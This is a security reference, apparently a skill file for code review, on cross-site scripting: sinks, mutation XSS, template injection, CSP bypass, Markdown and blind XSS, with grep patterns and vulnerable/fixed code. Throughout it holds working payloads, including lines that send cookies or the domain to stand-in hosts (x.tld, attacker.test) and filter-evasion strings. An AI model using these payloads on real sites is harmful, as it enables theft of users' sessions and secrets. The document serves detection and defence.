---
name: xss
description: XSS testing covering reflected, stored, DOM-based, blind (out-of-band stored), mutation XSS (mXSS — sanitizer-vs-browser parser differential, SVG/MathML namespace confusion), and Markdown-rendering (link/image URI scheme injection) vectors with CSP bypass techniques
---

# XSS

Cross-site scripting persists because context boundaries, parser behavior, and framework-specific edges combine in non-obvious ways. Every user-influenced string must be treated as untrusted until it has been strictly encoded for the exact sink it reaches, and guarded by a runtime policy such as CSP or Trusted Types.

## Class Boundaries

**What XSS IS** — unescaped, unsanitized user input reaching an HTML/JS/DOM output sink:

- **Server-side HTML sinks**: `{{ var | safe }}`, `mark_safe(var)`, `Markup(var)`, `<%- var %>` (EJS), `{{{ var }}}` (Handlebars), `!{var}` (Pug), `th:utext`, `[(${var})]` (Thymeleaf), `{!! $var !!}` (Blade), `raw(var)` / `.html_safe` (Rails), `echo $var` without `htmlspecialchars()`, `@Html.Raw(var)`, `template.HTML(var)` (Go bypass), `render_template_string(f"...{var}...")`, `res.send("<p>" + var + "</p>")`
- **Client DOM sinks**: `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`, jQuery `.html()`/`.append()`, `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{@html}`, `bypassSecurityTrustHtml(var)`
- **JS execution sinks**: `eval(var)`, `setTimeout(var, …)` / `setInterval(var, …)` with string args, `new Function(var)()`, `scriptElement.text = var`, event-handler attributes (`onclick`, `href="javascript:…"`), `location.href = var` when scheme is attacker-controlled

**What XSS is NOT** (commonly confused with):

- **CSRF** — forged requests on behalf of a user; separate class
- **Clickjacking** — iframe overlay attacks; separate class
- **HTTP response splitting** — newline injection into response headers; separate class
- **SQLi via XSS** — the SQL injection is the primary finding; XSS is a delivery vector
- **Auto-escaped template output** — `{{ var }}` (Jinja2/Django/Twig/Handlebars with escaping on), `<%= var %>` (EJS), `@var` (Razor), `th:text` (Thymeleaf)
- **`textContent` / `innerText`** — plain text only; no HTML parsing

## Where to Look

**Types**
- Reflected, stored, DOM-based, and blind (out-of-band stored, rendered in a privileged/internal viewer) XSS across web, mobile, and desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR rendering pipelines

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping mechanisms

## Sink Locations

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email and PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML filenames and EXIF fields, office documents processed server-side or client-side

### Recon Indicators (grep-able sink patterns)

Flag any dynamic variable passed to these sinks; taint tracing confirms exploitability.

**Server-side unescaped output**
- Jinja2/Django: `\| safe`, `{% autoescape off %}`, `Markup(`, `mark_safe(`, `format_html(` with user args
- EJS: `<%- `; Handlebars: `{{{`; Pug: `!{`; Twig: `\| raw`; Blade: `{!!`; Thymeleaf: `th:utext`, `[($`
- Rails: `raw(`, `.html_safe`, `<%= raw`; PHP: `echo $`, `print $`, `<?=` without `htmlspecialchars`
- Go: `template.HTML(`, `template.JS(`, `text/template` for HTML; C#: `@Html.Raw(`, `MvcHtmlString.Create(`
- String-built HTML: `res.send("<`, `f"<.*{var}`, `render_template_string(f`

**Client DOM / JS sinks**
- `.innerHTML\s*=`, `.outerHTML\s*=`, `insertAdjacentHTML(`, `document\.write(`
- jQuery: `\.html\(`, `\.append\(`, `\$\('<.*' \+`
- React: `dangerouslySetInnerHTML`; Vue: `v-html`; Angular: `\[innerHTML\]`, `bypassSecurityTrust`
- `eval\(`, `new Function\(`, `setTimeout\(\s*\w+`, `setInterval\(\s*\w+` (string arg, not function ref)
- URL sinks: `location\.(href|replace|assign)\s*=`, `.setAttribute\(['"]href`, `.src\s*=`, `.action\s*=`

**DOM-based sources** (pair with any sink above)
- `location\.(search|hash|href)`, `document\.(referrer|URL|cookie)`, `window\.name`, `postMessage` / `event\.data`, `URLSearchParams`, `localStorage` / `sessionStorage`

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure the attribute is quoted; unquoted attributes must never carry user data
- **URL/JS URL**: encode and validate scheme against an allowlist (https/mailto/tel); reject javascript and data schemes
- **JS string**: escape quotes, backslashes, and newlines. `JSON.stringify`/`json.dumps` alone is **NOT** safe inside an inline `<script>` — see "Data serialized into an inline `<script>`" below
- **CSS**: avoid injecting into style rules; sanitize property names and values; watch for `url()` and `expression()`
- **SVG/MathML**: treat as active content; many elements execute via onload or animation events

### Data serialized into an inline `<script>` (JSON/serializer context breakout)

A very common SSR pattern embeds server data into an inline script: `<script>var data = {{ json }}</script>`. JSON serializers (`json.dumps`, `JSON.stringify`, `@json`, `to_json`) are **not HTML-context-aware** — they escape `"` and `\` but leave `<`, `/`, and the line terminators U+2028/U+2029 untouched. So a string value containing `</script>` closes the script element regardless of the surrounding JSON quoting, and the rest of the value parses as fresh HTML:

```python
# VULN: value reflected through json.dumps into an inline <script>
page = '<script>var d = ' + json.dumps({"identity": user_input}) + ';</script>'
# user_input = '</script><svg onload=alert(document.domain)>'  → breaks out of the script context
```

The same defect appears with **any serializer or transform that passes through unexpected input unchanged** into a script context — e.g. a regex "extractor" that returns its *original input* when the pattern fails to match (`preg_replace('~^(\d\.?\d).*~s', '\1', $version)` returns `$version` verbatim on no match), or a value sourced from a place developers assume is trusted (a DB-handshake/version string from a server the attacker controls). A per-request CSP **nonce** does not help when the injection lands *inside* an already-nonced legitimate `<script>`.

**SAFE**: serialize with a context-aware encoder that escapes `<`, `>`, `&`, `/`, U+2028, U+2029 (e.g. replace `<` → `\u003c`, `/` → `\/`), or emit the data in a `<script type="application/json">` block and `JSON.parse(element.textContent)` instead of interpolating into executable script. Template auto-escaping for HTML text does **not** apply inside `<script>`.

**Grep seeds**: `json\.dumps|JSON\.stringify|to_json|@json|json_encode` whose output is concatenated/interpolated inside `<script`…`</script>`; `preg_replace|re\.sub|replace` "extractors" feeding a `<script>` sink; `innerHTML`/template literal building a `<script>` from data.

## Vulnerability Patterns

### DOM XSS

**Sources**
- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages

**Sinks**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
- `setAttribute`, `setTimeout`/`setInterval` when called with string arguments
- `eval`/`Function`, `new Worker` with blob URLs

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

**Query-string parser differential (validate-server / use-client on raw URL)**: when the **server** validates a parameter with one query parser and the **browser** later reads the *same raw query string* with a different parser to make a security decision (redirect, render), an attacker can make the two disagree — server sees the safe value, browser sees the payload. Express's `qs` (extended parser) vs the browser's `URLSearchParams` is the canonical pair, with several independent disagreements:

- **`]=` split priority** — `qs` splits the key/value at `]=` if present, not the first `=`; `URLSearchParams` always splits at the first `=`. `?redirect=javascript:alert(1)//?x]=x&redirect=https://good.test` → server's `redirect` = `https://good.test` (valid), browser's `.get('redirect')` = `javascript:alert(1)//?x]=x`.
- **Bracket stripping** — `qs` turns `[redirect]=v` into key `redirect`; to `URLSearchParams` the key is literally `[redirect]`. Feed the safe value as `[redirect]=...` (server happy, browser ignores it) and the payload as a separate `redirect=...`.
- **`parameterLimit` truncation** — `qs` parses only the first N params (default 1000) and silently drops the rest; `URLSearchParams` has no limit. Pad 1000 junk params between a safe `[redirect]=...` and a trailing malicious `redirect=javascript:...` so only the browser sees the payload.

```javascript
// VULN: server validates req.query.redirect_uri (qs), client navigates on the raw URL (URLSearchParams)
if (req.query.redirect_uri !== ALLOWED) return res.send('invalid');
res.send(`<script>location = new URLSearchParams(location.search).get('redirect_uri')</script>`);
```

**SAFE**: parse the value **once** server-side and pass the *parsed/validated* value to the client (embed it as data, don't re-parse the raw URL in JS); validate against an exact allowlist; never let a client-side parser re-derive a security-relevant value from `location.search`/`location.hash`. **Grep seeds**: `app.set('query parser'`, `qs.parse`, client `URLSearchParams(location.search)`/`location.hash` used for `location =`/redirect/`innerHTML` after a server-side check on the same param.

### DOM-based XSS from GraphQL response data

Client-side JavaScript that renders fields from a GraphQL response into the DOM via unsafe sinks without sanitization. A GraphQL API response is an **untrusted source** like any other server response — `data.*` fields may contain attacker-controlled markup. This also covers **stored XSS through GraphQL**: a mutation persists an attacker payload, a later query returns it, and the client renders it unsafely. Server-side resolver HTML/XSS (args → HTML string in resolvers) is covered in `graphql_injection.md`.

**Vulnerable conditions**:
- GraphQL response fields (`data.*`, nested objects, list items) flow to `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `[innerHTML]` / `bypassSecurityTrustHtml`, or jQuery `.html()` without sanitization
- Client treats response JSON as trusted because it originated from the application's own API endpoint
- Stored path: mutation persists HTML/script payload; subsequent query or subscription delivers it to clients that inject raw response values into the DOM
- GraphQL client call (`useQuery`, `useMutation`, `gql`, client `query`/`mutate`, `fetch('/graphql')`) paired with an unsafe HTML sink in the same component, effect, or callback chain

**Grep seeds**:
```bash
rg -n "dangerouslySetInnerHTML|v-html|\[innerHTML\]|bypassSecurityTrustHtml|\.innerHTML\s*=|\.html\(|insertAdjacentHTML|document\.write" --glob '*.{js,jsx,ts,tsx,vue}'
rg -n "useQuery|useMutation|useLazyQuery|gql|apolloClient|client\.query|client\.mutate|fetch\(['\"]/?graphql" --glob '*.{js,jsx,ts,tsx,vue}' -l | xargs rg -n "innerHTML|dangerouslySetInnerHTML|v-html|\.html\(|insertAdjacentHTML"
rg -n "data\.\w+.*innerHTML|response\.data|result\.data" --glob '*.{js,jsx,ts,tsx,vue}' -C3
```

**VULN**:
```jsx
const { data } = useQuery(GET_COMMENT);
useEffect(() => {
  if (data?.comment?.body) {
    document.getElementById('content').innerHTML = data.comment.body;
  }
}, [data]);
```

**SAFE**:
```jsx
const { data } = useQuery(GET_COMMENT);
return <div>{data?.comment?.body}</div>;   // framework auto-escaping
// or: el.textContent = data.comment.body;
// or: el.innerHTML = DOMPurify.sanitize(data.comment.body);
```

**Cross-ref**: resolver-layer reflected/stored XSS — `graphql_injection.md`; CSP and Trusted Types as defense-in-depth when HTML sinks cannot be eliminated — `content_security_policy.md`.

### Mutation XSS (mXSS)

**Core mechanism**: input is sanitized as a *string* and the sanitizer's parse tree says "safe" — then the markup is assigned to an HTML sink (`innerHTML`/`outerHTML`/`insertAdjacentHTML`/`<template>`), the **browser re-parses it and mutates the DOM**, and inert-looking markup becomes a live element/attribute that executes. The bug is the **parser differential**: the sanitizer's parse ≠ the browser's render parse, or the same string parses differently on the second round-trip. Classic trigger: sanitize → set `innerHTML` → browser reparses.

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

**Mutation categories (where the parse trees diverge)**:
- **Namespace confusion (HTML ↔ SVG ↔ MathML)** — the highest-value class. A node that is inert text in one namespace becomes an executable element/attribute after the browser switches namespaces. Watch HTML integration points (`<svg>` `foreignObject`/`desc`/`title`; MathML `mi`/`mo`/`mn`/`ms`/`mtext`, and `<annotation-xml encoding="text/html">`), `mglyph`/`malignmark` re-namespacing, **foreign-content breakers** (`<b>`,`<p>`,`<img>`,`<br>`,`<table>`,`<meta>`,… and `<font color|face|size>`) that pop back into HTML, and `<svg><image>`→`<img>` rewriting.
- **Parser repair / re-nesting** — `table`/`select`/`form`/`a`/heading nesting fix-ups relocate a node out of the context it was sanitized in; **active formatting elements** (`a b big code em font i nobr s small strike strong tt u`) get duplicated across serialize→reparse round-trips; `noscript` parses differently with JS enabled vs disabled (DOMParser/server parse has scripting **off**, the live page has it **on**).
- **Backend/sanitizer parser differential (HTML5 vs HTML4/XML/PHP/regex)** — sanitizing with a non-HTML5 parser (PHP `DOMDocument`, an XML/XHTML parser, or regex) then rendering as HTML5 in the browser: RCDATA/RAWTEXT decoding (`textarea`,`title`,`style`,`xmp`), comment differentials (`<!-->`, `<!-- > ... -->`), `<!DOCTYPE>`/processing-instruction (`<? … ?>`)/underscore element names (`<_test>`), and unhandled foreign `math`/`svg` blocks all bypass the sanitizer's model.
- **Serialization quirks** — the `is` attribute survives serialization after `removeAttribute`; a NULL byte becomes U+FFFD inside an element name; entities decode inside `noscript` content and inside `style` within the SVG/MathML namespaces.

**SAST signals**:
- **Sanitize→`innerHTML` round-trip**: a sanitizer call (`DOMPurify.sanitize`, `sanitize-html`, `nh3`/`bleach`, custom) whose **string** output is then assigned to `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`<template>`. Re-reading `el.innerHTML` after setting it (re-serialize→reparse) is a strong mXSS tell.
- **Foreign content allowed in sanitizer config**: SVG/MathML enabled (`USE_PROFILES: { svg: true, mathMl: true, html: true }`) or allowing `style`/`foreignObject`/`annotation-xml`/`mglyph`/`mtext`/`<template>` without need — widens the mutation surface.
- **Two different parsers in the pipeline**: server-side XML/PHP/regex sanitization feeding browser HTML5 rendering (parser-differential bypass), or sanitizing in a `DOMParser('text/html')`/`text/xml` context different from the render context.
- **Stale or hand-patched sanitizer**: a vendored/forked HTML sanitizer or one pinned to an old version — published mXSS bypasses target specific releases; SAST-relevant as a maintenance/config signal (not a version-CVE claim).

```bash
# sanitize output that flows into an HTML sink (round-trip)
rg -n "DOMPurify\.sanitize|sanitize-html|sanitizeHtml|bleach\.clean|nh3\.clean" --glob '*.{js,jsx,ts,tsx,py}' -A2 | rg -n "innerHTML|outerHTML|insertAdjacentHTML|\.html\(|template"
# foreign-content / risky allowlist in sanitizer config
rg -n "USE_PROFILES|svg:\s*true|mathMl:\s*true|ADD_TAGS|ADD_ATTR|foreignObject|annotation-xml|mglyph|FORCE_BODY" --glob '*.{js,jsx,ts,tsx}'
# server-side non-HTML5 parser feeding the browser
rg -n "DOMDocument|loadHTML|loadXML|lxml|html5lib|DOMParser\(.*text/xml" --glob '*.{php,py,js,ts}'
```

**SAFE**:
- Avoid the round-trip: render untrusted text with `textContent` (no HTML parse). When HTML is required, sanitize with a **well-maintained, current** library that parses with the **same HTML5 engine** the browser uses (DOM-based sanitizers parse via the DOM — prefer these over server-side XML/regex sanitizers that feed browser HTML).
- **Forbid foreign content unless explicitly needed**: disable SVG/MathML profiles and drop `foreignObject`/`annotation-xml`/`mglyph`/`mtext`/`style`/`<template>` from the allowlist.
- **Idempotent sanitization**: sanitize the *parsed DOM*, not a raw string, and re-sanitize until the output is stable (a value that changes when re-parsed is a mutation). Keep one parser across the whole pipeline.
- Defense-in-depth: CSP + Trusted Types so a mutation that slips through still cannot run inline script — see `content_security_policy.md`.

### Client-Side Template Injection (CSTI) / template expression evaluation

Distinct from reflected/DOM XSS and from **server-side** template injection (`ssti.md`): the app reflects user input into a DOM region that a **client-side framework then compiles as a template**, so the framework's expression evaluator runs attacker expressions. **HTML-encoding does not prevent it** — `{{ }}` / directives are not HTML, so they survive entity-encoding and a sink that "escapes HTML" still lets the template engine evaluate them. Classic in AngularJS (`ng-app` scans its DOM subtree for `{{ }}`), and in any runtime template compilation.

**SAST signals — user input reaching a runtime template compiler / expression evaluator**:
- AngularJS: `$compile(userInput)(scope)`, `$interpolate(userInput)(scope)`, `$parse`, or server-rendered user data placed **inside** an `ng-app`/`ng-controller` subtree; `$sce.trustAsHtml`/`trustAsJs` on user input
- Vue: `new Vue({ template: userInput })`, `Vue.compile(userInput)`, `app.component({ template: userInput })` on the runtime-compiler build (user-controlled `template`)
- Generic: `Handlebars.compile(userInput)`, lodash/underscore `_.template(userInput)`, or any "render this string as a template" API fed user input and rendered client-side
- Tell-tale: the reflected value lands inside a template-compiled element (not bound as text), so a sandbox-escape payload executes even though the response is HTML-escaped

**Payload (AngularJS sandbox escape)**:
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

**Grep seeds**:
```bash
rg -n "\$compile\(|\$interpolate\(|\$parse\(|\$sce\.trustAs|Vue\.compile\(|new Vue\([^)]*template|Handlebars\.compile\(|_\.template\(" --glob '*.{js,ts,jsx,tsx,vue,html}'
rg -n "template:\s*.*(req|input|params|query|userInput|body)" --glob '*.{js,ts,jsx,tsx,vue}'
rg -n "ng-app|ng-bind-html|ng-csp" --glob '*.{html,js,ts}'
```

**VULN**: server reflects `name` into an `ng-app` page — `<h1>Hello {{name}}</h1>` with `name = {{constructor.constructor('alert(1)')()}}`; or `$compile(userHtml)(scope)` / `_.template(userTpl)()`.

**SAFE**: never render user input inside a template-compiled region; bind it as **text** (`ng-bind`, framework `{{ }}` interpolation of *data values* — not compiling user strings) and never pass user input to `$compile`/`Vue.compile`/`Handlebars.compile`/`_.template`. HTML-encoding alone is NOT a fix.

### CSP Bypass

- Weak policies: missing nonces/hashes, wildcard source entries, `data:` or `blob:` permitted, inline events allowed
- Script gadgets: JSONP endpoints, libraries that expose function constructors
- Import maps or modulepreload directives with insufficiently scoped policies
- Base tag injection to retarget relative script URLs to attacker-controlled origins
- Dynamic module import through permitted origins

### Trusted Types Bypass

- Custom policies that return unsanitized strings; abuse of whitelisted policy names
- Sinks not covered by Trusted Types (CSS, URL handlers) exploited through available gadgets

### CSS data exfiltration via sanitizer-allowed `<style>`

When script XSS is blocked (strict CSP `script-src`, or an HTML sanitizer that strips event handlers/scripts), injected **CSS** is still a data-exfiltration primitive — and `style-src` is usually far more permissive than `script-src`. Critically, **DOMPurify allows `<style>` by default** (it is not script-executing), so HTML injection that "only" survives as a `<style>` tag is *not* harmless: attribute selectors + `background:url(...)` leak the values of other elements on the page (CSRF tokens, OAuth `code`/`token` reflected into the DOM, hidden input values).

- **Mechanism**: `input[name=secret][value^="a"]{background:url(//attacker.test/leak?c=a)}` fires a request only when the prefix matches; `:has()` selectors (`html:has(script[src*="token=49"])`) leak values reflected into other tags' attributes. **Sequential import chaining** (`@import url(//attacker.test/next)`) extracts a secret character-by-character without JS, and `:is(div)`-stacking works around CSS specificity across rounds.
- **Additional CSS-only oracle channels** (no `url()` on the secret element needed): `@font-face{ unicode-range:U+0061; src:url(//attacker.test/has-a) }` loads the font (and fires the request) **only if that character is present** on the page — a per-character presence oracle; **ligature/width side-channels** use a custom font whose ligatures change element width, detected via `overflow`/scrollbar appearance or a `@media`/container size query that then triggers a `background:url(...)`; CSS `if()` + custom properties allow this branching inline (in a `style` attribute) without an external stylesheet. These survive when `url()` on the target is blocked but `@font-face`/`@import` to `font-src`/`style-src` is allowed.
- **Source surface**: reflection into a `<style>` block, or sanitized HTML injection where angle brackets are filtered (so you cannot break out of the tag for XSS) but `<style>`/CSS survives. Often chained with an OAuth/redirect reflection that places the victim's token into the injectable page.

**SAFE**: configure the sanitizer to drop `<style>` and `style` attributes when not needed (`FORBID_TAGS:['style'], FORBID_ATTR:['style']`); set a strict CSP `style-src` (no wildcard, no attacker origins) and lock `img-src`/`default-src` so `url()` cannot reach external hosts; never reflect secrets (tokens, `code`, CSRF) into a page that also renders user-controlled markup. **Grep seeds**: `DOMPurify.sanitize` without `FORBID_TAGS`/`ALLOWED_TAGS` excluding `style`; reflection into `<style>`; permissive `style-src`/`img-src` in CSP alongside token-bearing pages.

## Polyglot Payloads

Maintain a compact, context-tuned set:
- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML`
- Secondary: event handlers or URL values sourced from untrusted input
- Bypass patterns: unsanitized HTML flowing through third-party libraries; custom renderers that use innerHTML internally

### Vue

- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can cause the browser to re-interpret server-supplied content

### Angular

- Legacy expression injection (pre-1.6) — see **Client-Side Template Injection (CSTI)** above (`$compile`/`$interpolate` and user data inside an `ng-app` subtree)
- `$sce` trust APIs misused to whitelist attacker-controlled markup

### Svelte

- Sinks: `{@html}` and dynamic attribute expressions

### Meta-Frameworks (SSR Sinks)

**Next.js**
- `dangerouslySetInnerHTML` in server components or pages — same risk as client React
- `getServerSideProps` / `getStaticProps` returning unsanitized HTML that reaches `dangerouslySetInnerHTML`
- `next/head` with user-controlled `<script>` or meta content injection
- API routes (`pages/api/`) returning HTML responses with user data — treated as server-rendered XSS

**Nuxt (Vue SSR)**
- `v-html` in SSR-rendered components — HTML injected during server render is sent to all clients
- `useAsyncData` / `useFetch` returning unsanitized content rendered via `v-html`
- Nuxt `server/api/` handlers returning HTML with user input

**SvelteKit**
- `{@html userInput}` in SSR-rendered `.svelte` components — same as client-side but affects all users
- `+page.server.ts` / `+layout.server.ts` load functions returning unsanitized data that reaches `{@html}`
- Form actions returning HTML content with user-controlled values

**Key principle**: SSR XSS is typically **stored-equivalent** in severity because the malicious output is rendered server-side and served to every requesting client, not just the attacker's browser.

### Markdown/Richtext

Rendering user-supplied Markdown to HTML has **two independent XSS surfaces** — and the second one fires even when raw/inline HTML is fully disabled, so "HTML is off" is not a sufficient defense.

**(A) Raw/inline HTML passthrough** — the renderer emits author-supplied `<script>`, `<img onerror=…>`, etc. verbatim. Triggered by enabling raw HTML or re-adding it via a plugin:
- `marked(input)` (older defaults) / `marked.parse(input)` without a post-sanitize step
- `markdown-it({ html: true })` (off by default; the flag turns the hole on)
- `showdown` with no output sanitizer; `snarkdown` (no sanitizer at all)
- `commonmark`/`commonmarker` with `UNSAFE` / `allowDangerousHtml`
- remark/rehype pipelines using `rehype-raw` or `dangerouslySetInnerHTML` on the rendered string; `react-markdown` with `rehypePlugins:[rehypeRaw]` or a `skipHtml:false` + raw plugin
- Python `markdown.markdown(input)` then `| safe` / `Markup(...)` (autoescape bypassed)

**(B) Dangerous URI scheme in link/image targets** — `[text](URL)` becomes `<a href="URL">` and `![alt](URL)` becomes `<img src="URL">`. If the renderer does not allowlist the URL scheme, a navigation/load executes script. This is the dominant Markdown-specific vector and **survives `html:false`**:
- Link href: `[x](javascript:alert(1))`, `[x](vbscript:alert(1))`
- Image/link to an HTML data URI: `![x](data:text/html;base64,PHNjcmlwdD4uLi48L3NjcmlwdD4=)`
- Autolink form: `<javascript:alert(1)>`
- Reference-style definition: `[ref]: javascript:alert(1)` then `[x][ref]`

**Scheme obfuscation a denylist misses** (normalize/decode before allowlisting — never match the literal string `javascript:`):
- Whitespace/tab/newline split inside the scheme: `j a v a s c r i p t:`, `java\nscript:`
- HTML entities (named/dec/hex), whole or partial: `&#x6A;…`, `&#106;…`, `Javas&#99;ript:`
- Mixed case: `JaVaScRiPt:`
- `javascript://%0d%0aalert(1)` — the `//` + CRLF turns the host portion into a comment so the payload still runs
- Leading control chars / `\x00`-`\x1f` before the scheme
- Title/alt breakout into an attribute: `![a]("onerror="alert(1))`, `![a](https://h/i.png"onload="alert(1))`

**SAST signal**: user-controlled text reaches a Markdown→HTML renderer and the result is emitted into the DOM (`innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `| safe`, `Html.Raw`) **without** (a) raw HTML disabled AND (b) an output HTML sanitizer that allowlists URL schemes after decoding. Relying on the renderer's own `sanitize` option is a finding — it is deprecated/removed in current `marked` and absent in several libraries.

```javascript
// VULN — raw HTML on, no post-sanitize: <script>/<img onerror> pass straight through
const html = marked.parse(userMarkdown);            // older marked: HTML enabled
el.innerHTML = html;

// VULN — html:false still renders [x](javascript:...) / ![x](data:text/html,...) as live href/src
const md = require("markdown-it")({ html: false });
el.innerHTML = md.render(userMarkdown);

// SAFE — render with raw HTML off, then sanitize output and allowlist URL schemes
import DOMPurify from "dompurify";
const md = require("markdown-it")({ html: false, linkify: true });
const dirty = md.render(userMarkdown);
el.innerHTML = DOMPurify.sanitize(dirty, {
  ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i,   // reject javascript:/vbscript:/data:
});
```

```python
# VULN — output marked safe, so javascript: links and any raw HTML execute
from markupsafe import Markup
import markdown
return Markup(markdown.markdown(user_text))

# SAFE — render, then run an allowlist sanitizer (e.g. nh3/bleach) that drops
#        non-http(s) schemes and disallowed tags/attributes after decoding
import markdown, nh3
html = markdown.markdown(user_text)
return nh3.clean(html, url_schemes={"http", "https", "mailto"})
```

**Grep seeds** — Markdown render reaching an HTML sink, dangerous flags, or no sanitizer:
```bash
# renderers + dangerous raw-HTML flags
rg -n "marked\(|marked\.parse|markdown-it|new Remarkable|showdown|snarkdown|react-markdown|rehype-raw|commonmark|markdown\.markdown" --glob '*.{js,jsx,ts,tsx,py,rb,go}'
rg -n "html:\s*true|allowDangerousHtml|dangerouslySetInnerHTML|UNSAFE|skipHtml:\s*false|rehypeRaw" --glob '*.{js,jsx,ts,tsx}'
# rendered markdown emitted raw, and whether a sanitizer is present nearby
rg -n "DOMPurify\.sanitize|sanitize-html|nh3|bleach\.clean|ALLOWED_URI_REGEXP" --glob '*.{js,jsx,ts,tsx,py}'
```

### Client-side diagram / charting renderers (Mermaid, chart libs)

Markdown platforms and dashboards increasingly render fenced ` ```mermaid `/diagram/chart blocks **client-side**, turning the diagram library into its own injection sink that the HTML sanitizer on the *Markdown* path never sees. These libraries build SVG/HTML from attacker text and accept an `init`/config directive in the source, which adds several distinct sinks:
- **HTML labels rendered without (or with bypassable) sanitization** — many chart libs render node/label text as HTML. A config such as `securityLevel`/`htmlLabels` controls sanitization, and a **string-vs-boolean type confusion** (the lib treats the *string* `"false"`/`"loose"` as enabling HTML while a check expected a boolean) re-enables raw HTML labels → XSS.
- **`init` directive merged into render options → prototype pollution** — an attacker `%%{init: { ... "__proto__": {...} }}%%` (or JSON config) is deep-merged into the library's options, polluting `Object.prototype` and reaching a downstream gadget/template (stored XSS). Cross-ref `client_side_prototype_pollution.md`.
- **Config JSON written into `<style>.innerHTML`** — theme/`init` values flow into generated CSS assigned via `style.innerHTML`; an attacker closes the `<style>` and injects markup (CSS-context breakout). Cross-ref the `<style>` exfil note above.
- **Injected class names hijack delegated handlers** — diagram output can set arbitrary `class`/`id`; if the app wires delegated listeners (`$(root).on('click', '.btn-…')`), attacker-chosen classes trigger authenticated actions on click (a CSRF/clickjacking-adjacent sink). 
- **Parser DoS** — pathological diagram syntax hangs the client renderer (cross-ref `denial_of_service.md`, client-side parser complexity).

**SAST signal**: user-controlled text reaches a diagram/chart renderer (`mermaid.render`/`mermaid.init`/`.initialize`, chart `init`/`directive`/`mergeConfig`) with `securityLevel` set to `loose`/`antiscript` (or absent), `htmlLabels`/`html:true`, or where the source `%%{init}%%`/config is not stripped before rendering. Treat the diagram library as an HTML sink independent of the Markdown sanitizer.

```javascript
// VULN: loose security + attacker init directive → HTML labels + __proto__ merge
mermaid.initialize({ securityLevel: 'loose', htmlLabels: true });
mermaid.render('id', userDiagramSource);   // source may contain %%{init: ...}%%

// SAFE: strict security level, no HTML labels, strip/ignore inline init from untrusted source
mermaid.initialize({ securityLevel: 'strict', htmlLabels: false, secure: ['securityLevel','htmlLabels'] });
```

## Blind XSS (Out-of-Band Stored)

Blind XSS is **stored XSS where the payload executes in a different, often privileged, viewing context the attacker never directly sees** — and the attacker gets **no reflected response** at injection time. The input is persisted/logged at a low-trust (frequently unauthenticated) entry point and rendered raw later in an internal tool. Severity is usually high: it fires in the session of a staff/admin user.

**Render contexts where it fires** (the value is emitted into an HTML sink here, not where it was submitted): admin dashboards, support/helpdesk agent consoles, moderation queues, log viewers / SIEM / analytics UIs, generated reports / PDF exports, monitoring and internal CRUD tools.

**Source surfaces distinctive to blind XSS** — values that look harmless at ingest but get displayed raw in an internal view, and are easy to miss because they are not obvious form fields:
- Request headers logged then shown to staff: `User-Agent`, `Referer`, `X-Forwarded-For`, `Origin`, custom client headers
- Support/contact/feedback tickets, abuse reports, order notes, appointment/comment fields
- Signup/profile metadata surfaced in admin (display name, company, address, bio)
- Filenames and upload metadata listed in an admin file browser
- Webhook/integration payloads and API client/app names rendered in a dashboard
- Exception/error messages and audit-log entries surfaced in an admin console
- **Received-email content rendered by webmail / mail clients**: SMTP headers and message bodies are fully sender-controlled. Webmail that renders the `List-Unsubscribe` URL as a clickable unsubscribe link/button, or displays sender display names / message HTML, turns the email into a stored-XSS source — e.g. a `List-Unsubscribe: <javascript://host/%0aalert(document.domain)>` header emitted into an `<a href>` (see URL-scheme sinks). The viewer (recipient) is a different principal than the attacker (sender)

**SAST signal — store-here / render-elsewhere across a trust boundary**: the **write** sink (persist or log) and the **read/render** sink live in *different* templates, apps, or privilege tiers, and the render side **skips contextual encoding because the data is assumed internal/trusted**. Detect by correlating an untrusted ingest → store/log step with a *separate* privileged view that emits the stored value into an HTML sink without encoding. A raw HTML sink in an admin/internal template fed by user-originated stored or logged data is the finding even when no attacker-facing reflection exists.

```python
# VULN (ingest): request header logged verbatim from an unauthenticated endpoint
log_entry.user_agent = request.headers.get("User-Agent")   # attacker-controlled
db.session.add(log_entry)

# VULN (render, different template / admin app): emitted raw into the staff log viewer
# admin/access_log.html  ->  <td>{{ entry.user_agent | safe }}</td>   # fires in admin session
```

**Grep seeds** — pair an untrusted ingest/log with a raw render in an admin/internal view:
```bash
# user-originated values persisted/logged (header & support-field sources)
rg -n "User-Agent|Referer|X-Forwarded-For|getHeader\(|headers\[|ticket|feedback|contact|user_agent" --glob '*.{py,js,ts,java,go,rb,php}'
# raw HTML sinks inside admin/internal/staff templates rendering stored values
